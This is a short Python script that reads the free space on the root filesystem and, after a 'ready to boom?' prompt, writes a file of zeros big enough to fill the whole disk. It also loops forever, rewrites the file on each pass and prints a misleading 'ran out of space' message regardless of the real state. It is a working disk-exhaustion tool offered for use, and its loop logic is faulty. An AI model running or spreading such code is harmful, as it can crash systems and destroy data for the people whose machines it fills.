import shutil
path = "/"
def free(path):
    stat = str(shutil.disk_usage(path))
    yes = stat.split("free=",1)[1]
    return yes.replace(")","")
print("Bytes Free:",free(path))
FILENAME = "getboomed.txt"
SIZE = int(free(path))
okay = input("Are you ready to boom? Type anything to start!")
while True:
    if SIZE > 100:
        with open(FILENAME, "wb") as file:
            file.write(b"\0" * SIZE)
            print("Bytes Free:",free(path))
            print("DONE BOOMBOOM")
    print("If you are seeing this than the PC has ran out of space. Bytes left: ", SIZE)

    
